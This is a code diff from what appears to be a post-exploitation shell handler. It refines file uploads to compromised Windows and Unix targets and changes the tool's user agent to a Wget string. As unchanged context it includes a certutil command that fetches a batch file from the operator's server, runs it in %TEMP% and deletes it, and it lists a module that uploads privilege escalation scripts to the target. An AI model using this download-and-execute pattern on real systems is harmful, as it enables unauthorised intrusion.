@@ -2758,17 +2758,11 @@ class Session:
 					logger.error(response)
 					return [] # TODO
 
-			# Present uploaded
-			altnames = list(map(lambda x: destination + ('/' if self.OS == 'Unix' else '\\') + x, altnames))
-
-			for item in altnames:
-				logger.info(f"{paint('Uploaded').GREEN_white} => {paint(shlex.quote(str(item))).yellow}")
-			return altnames
-
 		elif self.OS == 'Windows':
 			tempfile_zip = f'/dev/shm/{rand(16)}.zip'
 			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
 			with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
+				altnames = []
 				for item in resolved_items:
 					if isinstance(item, tuple):
 						filename, data = item
@@ -2783,6 +2777,7 @@ class Session:
 					else:
 						altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
 						myzip.write(item, arcname=altname)
+					altnames.append(altname)
 
 			server = FileServer(host=self._host, password=rand(8), quiet=True)
 			urlpath_zip = server.add(tempfile_zip)
@@ -2805,8 +2800,20 @@ class Session:
 				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
 				value=True, timeout=None)
 			server.stop()
-			if "DOWNLOAD OK" in response and "UNZIP OK" in response:
-				logger.info("Upload successful!") # TODO
+			if not "DOWNLOAD OK" in response:
+				logger.error("Data transfer failed...")
+				return []
+			if not "UNZIP OK" in response:
+				logger.error("Data unpacking failed...")
+				return []
+
+		# Present uploads
+		altnames = list(map(lambda x: destination + ('/' if self.OS == 'Unix' else '\\') + x, altnames))
+
+		for item in altnames:
+			uploaded_path = shlex.quote(str(item)) if self.OS == 'Unix' else f'"{item}"'
+			logger.info(f"{paint('Uploaded').GREEN_white} => {paint(uploaded_path).yellow}")
+		return altnames
 
 	def script(self, local_script):
 		if not self.agent:
@@ -3985,7 +3992,7 @@ class Options:
 		self.debug_logfile = "debug.log"
 		self.cmd_histfile = 'cmd_history'
 		self.debug_histfile = 'cmd_debug_history'
-		self.useragent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
+		self.useragent = "Wget/1.21.2"
 		self.modules = {
 			'upload_privesc_scripts':{
 				'description':'Upload privilege escalation scripts to the target',
@@ -4199,7 +4206,7 @@ def url_to_bytes(URL):
 		try:
 			response = urllib.request.urlopen(req, context=ctx, timeout=options.short_timeout)
 			break
-		except urllib.error.HTTPError as e:
+		except (urllib.error.HTTPError, TimeoutError) as e:
 			logger.error(e)
 		except urllib.error.URLError as e:
 			logger.error(e.reason)
